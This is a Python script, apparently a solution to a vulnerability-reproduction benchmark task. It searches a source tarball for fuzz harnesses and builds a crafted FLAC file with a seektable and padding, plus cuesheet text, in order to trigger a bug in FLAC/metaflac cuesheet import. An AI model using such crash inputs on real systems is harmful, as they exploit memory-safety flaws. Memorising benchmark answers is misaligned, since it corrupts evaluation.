import io
import os
import re
import struct
import tarfile
from typing import Optional, Tuple


def _metadata_header(is_last: bool, block_type: int, length: int) -> bytes:
    if not (0 <= block_type <= 127):
        raise ValueError("invalid block_type")
    if not (0 <= length <= 0xFFFFFF):
        raise ValueError("invalid length")
    first = (0x80 if is_last else 0x00) | (block_type & 0x7F)
    return bytes([first, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])


def _build_streaminfo(
    sample_rate: int = 44100,
    channels: int = 2,
    bits_per_sample: int = 16,
    total_samples: int = 100000,
    min_blocksize: int = 4096,
    max_blocksize: int = 4096,
    min_framesize: int = 0,
    max_framesize: int = 0,
) -> bytes:
    if not (1 <= channels <= 8):
        channels = 2
    if not (4 <= bits_per_sample <= 32):
        bits_per_sample = 16
    if not (1 <= sample_rate <= 655350):
        sample_rate = 44100
    if total_samples < 0:
        total_samples = 0
    total_samples &= (1 << 36) - 1

    b = bytearray()
    b += struct.pack(">H", min_blocksize & 0xFFFF)
    b += struct.pack(">H", max_blocksize & 0xFFFF)
    b += bytes([(min_framesize >> 16) & 0xFF, (min_framesize >> 8) & 0xFF, min_framesize & 0xFF])
    b += bytes([(max_framesize >> 16) & 0xFF, (max_framesize >> 8) & 0xFF, max_framesize & 0xFF])

    packed = (
        ((sample_rate & 0xFFFFF) << 44)
        | (((channels - 1) & 0x7) << 41)
        | (((bits_per_sample - 1) & 0x1F) << 36)
        | (total_samples & ((1 << 36) - 1))
    )
    b += packed.to_bytes(8, "big")
    b += b"\x00" * 16  # MD5
    if len(b) != 34:
        raise AssertionError("STREAMINFO must be 34 bytes")
    return bytes(b)


def _build_seektable(num_points: int = 6) -> bytes:
    if num_points < 1:
        num_points = 1
    pts = bytearray()
    for i in range(num_points):
        sample_number = i * 1000
        stream_offset = 0
        frame_samples = 0
        pts += struct.pack(">Q", sample_number & 0xFFFFFFFFFFFFFFFF)
        pts += struct.pack(">Q", stream_offset & 0xFFFFFFFFFFFFFFFF)
        pts += struct.pack(">H", frame_samples & 0xFFFF)
    return bytes(pts)


def _build_flac(num_seekpoints: int = 6, padding_len: int = 1) -> bytes:
    streaminfo = _build_streaminfo()
    seektable = _build_seektable(num_seekpoints)
    out = bytearray()
    out += b"fLaC"
    out += _metadata_header(False, 0, len(streaminfo)) + streaminfo
    if padding_len > 0:
        out += _metadata_header(False, 3, len(seektable)) + seektable
        out += _metadata_header(True, 1, padding_len) + (b"\x00" * padding_len)
    else:
        out += _metadata_header(True, 3, len(seektable)) + seektable
    return bytes(out)


def _build_cuesheet_text() -> bytes:
    # Minimal, broadly accepted CUE content
    return b'FILE "x" WAVE\n  TRACK 01 AUDIO\n    INDEX 01 00:00:00\n'


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        try:
            return b.decode("latin-1", "ignore")
        except Exception:
            return ""


def _type_to_size(t: str) -> Optional[int]:
    t = t.strip()
    t = t.replace("std::", "")
    t = t.replace("unsigned", "unsigned ")
    t = re.sub(r"\s+", " ", t)
    mapping = {
        "size_t": 8,
        "uint64_t": 8,
        "int64_t": 8,
        "unsigned long long": 8,
        "long long": 8,
        "unsigned long": 8,
        "long": 8,
        "uint32_t": 4,
        "int32_t": 4,
        "unsigned int": 4,
        "int": 4,
        "uint16_t": 2,
        "int16_t": 2,
        "unsigned short": 2,
        "short": 2,
        "uint8_t": 1,
        "int8_t": 1,
        "unsigned char": 1,
        "char": 1,
        "bool": 1,
    }
    return mapping.get(t)


def _infer_provider_prefix_size(text: str) -> int:
    low = text.lower()
    if "fuzzeddataprovider" not in low:
        return 0

    candidates = []
    for m in re.finditer(r"ConsumeIntegralInRange\s*<\s*([^>\s]+)\s*>", text):
        t = m.group(1)
        sz = _type_to_size(t)
        if sz:
            start = max(0, m.start() - 200)
            end = min(len(text), m.end() + 200)
            window = text[start:end].lower()
            score = 0
            if "consumebytes" in window:
                score += 2
            if "flac" in window:
                score += 3
            if "cue" in window or "cuesheet" in window:
                score += 1
            candidates.append((score, sz))
    for m in re.finditer(r"ConsumeIntegral\s*<\s*([^>\s]+)\s*>", text):
        t = m.group(1)
        sz = _type_to_size(t)
        if sz:
            start = max(0, m.start() - 200)
            end = min(len(text), m.end() + 200)
            window = text[start:end].lower()
            score = 0
            if "consumebytes" in window:
                score += 2
            if "flac" in window:
                score += 3
            if "cue" in window or "cuesheet" in window:
                score += 1
            candidates.append((score, sz))

    if candidates:
        candidates.sort(key=lambda x: (x[0], x[1]))
        return candidates[-1][1]

    return 8  # default for size_t on x86_64


def _detect_mode(src_path: str) -> Tuple[str, int]:
    # Returns (mode, prefix_size):
    # mode: 'flac_only', 'provider_split', 'len32_prefix'
    # prefix_size: bytes consumed to determine split (for provider_split)
    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = [m for m in tf.getmembers() if m.isfile()]
            # prioritize likely harness paths
            def prio(name: str) -> int:
                n = name.lower()
                p = 0
                if "fuzz" in n or "fuzzer" in n:
                    p += 5
                if "cue" in n:
                    p += 5
                if "cuesheet" in n:
                    p += 5
                if "metaflac" in n:
                    p += 3
                if n.endswith((".cc", ".cpp", ".c", ".cxx")):
                    p += 2
                if n.endswith((".h", ".hpp", ".hh")):
                    p += 1
                return -p

            members.sort(key=lambda m: prio(m.name))

            best_text = None
            best_score = -1

            for m in members:
                name = m.name.lower()
                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc")):
                    continue
                if m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                text = _safe_decode(data)
                low = text.lower()
                if "llvmfuzzertestoneinput" not in low and "afl_fuzz" not in low and "honggfuzz" not in low:
                    continue
                if "cuesheet" not in low and "import_cuesheet" not in low and "cue" not in low:
                    continue
                score = 0
                if "cuesheet" in low:
                    score += 3
                if "import_cuesheet" in low:
                    score += 5
                if "fuzzeddataprovider" in low:
                    score += 2
                if "metaflac" in low:
                    score += 1
                if score > best_score:
                    best_score = score
                    best_text = text
                if best_score >= 8:
                    break

            if best_text is None:
                return ("flac_only", 0)

            low = best_text.lower()
            if "fuzzeddataprovider" in low:
                ps = _infer_provider_prefix_size(best_text)
                return ("provider_split", ps)

            # Basic length-prefix heuristics (common in multi-part fuzzers)
            if re.search(r"memcpy\s*\(\s*&?\s*\w+\s*,\s*data\s*,\s*4\s*\)", low) and re.search(
                r"\buint32_t\b|\buint_fast32_t\b", low
            ):
                return ("len32_prefix", 4)

            return ("flac_only", 0)
    except Exception:
        return ("flac_only", 0)


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode, prefix = _detect_mode(src_path)

        # Use 6 seekpoints + 1 byte padding to match known-good structure (159 bytes FLAC-only).
        flac = _build_flac(num_seekpoints=6, padding_len=1)

        if mode == "flac_only":
            return flac

        cue = _build_cuesheet_text()

        if mode == "len32_prefix":
            return struct.pack("<I", len(flac)) + flac + cue

        if mode == "provider_split":
            # Provide an integral that will usually yield flac length for typical ConsumeIntegral/ConsumeIntegralInRange usage.
            if prefix <= 0:
                prefix = 8
            if prefix == 1:
                hdr = bytes([len(flac) & 0xFF])
            elif prefix == 2:
                hdr = struct.pack("<H", len(flac) & 0xFFFF)
            elif prefix == 4:
                hdr = struct.pack("<I", len(flac) & 0xFFFFFFFF)
            else:
                hdr = struct.pack("<Q", len(flac) & 0xFFFFFFFFFFFFFFFF)
                if prefix > 8:
                    hdr += b"\x00" * (prefix - 8)
            return hdr + flac + cue

        return flac